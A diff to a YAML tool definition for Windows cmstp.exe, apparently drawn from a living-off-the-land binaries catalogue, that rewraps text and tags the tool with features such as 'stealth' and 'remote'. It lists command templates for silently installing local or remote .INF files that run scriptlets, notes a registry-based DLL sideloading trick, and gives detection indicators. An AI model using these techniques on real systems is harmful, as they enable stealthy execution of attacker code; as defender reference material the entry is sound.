@@ -2,7 +2,8 @@
 id: windows-execution-cmstp
 namespace: windows:execution:cmstp
 name: cmstp
-description: 'Installs or removes a Connection Manager service profile. Located at: C:\Windows\System32\cmstp.exe; C:\Windows\SysWOW64\cmstp.exe.'
+description: 'Installs or removes a Connection Manager service profile. Located at:
+  C:\Windows\System32\cmstp.exe; C:\Windows\SysWOW64\cmstp.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -42,7 +43,15 @@ resource_profile:
 allowed-tools:
 - cmstp
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- process-manip
+- remote
+- stealth
 execution:
   template: cmstp
   sandbox: execFile
@@ -50,11 +59,21 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. (Execute code hidden within an inf file. Download and run scriptlets from internet.)
+- description: Silently installs a specially formatted local .INF without creating
+    a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes
+    a .SCT file using scrobj.dll. (Execute code hidden within an inf file. Download
+    and run scriptlets from internet.)
   command: cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
-- description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. (Execute code hidden within an inf file. Execute code directly from Internet.)
+- description: Silently installs a specially formatted remote .INF without creating
+    a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes
+    a .SCT file using scrobj.dll. (Execute code hidden within an inf file. Execute
+    code directly from Internet.)
   command: cmstp.exe /ni /s {REMOTEURL:.inf}
-- description: cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`. (Proxy execution of a malicious DLL via registry modification.)
+- description: cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App
+    Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly
+    to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled
+    DLL, this will sideload the DLL via `cmstp.exe`. (Proxy execution of a malicious
+    DLL via registry modification.)
   command: cmstp.exe /nf
 references:
 - label: '958450014111633408'
@@ -94,14 +113,14 @@ detections:
 - type: ioc
   description: DotNet CLR Usage Log - cmstp.exe.log
 - type: ioc
-  description: Registry modification to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll
+  description: Registry modification to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App
+    Paths\cmmgr32.exe\CmstpExtensionDll
 install:
 - method: choco
   package_name: cmstp
   commands:
   - choco install cmstp
 ---
-
 
 # cmstp
 
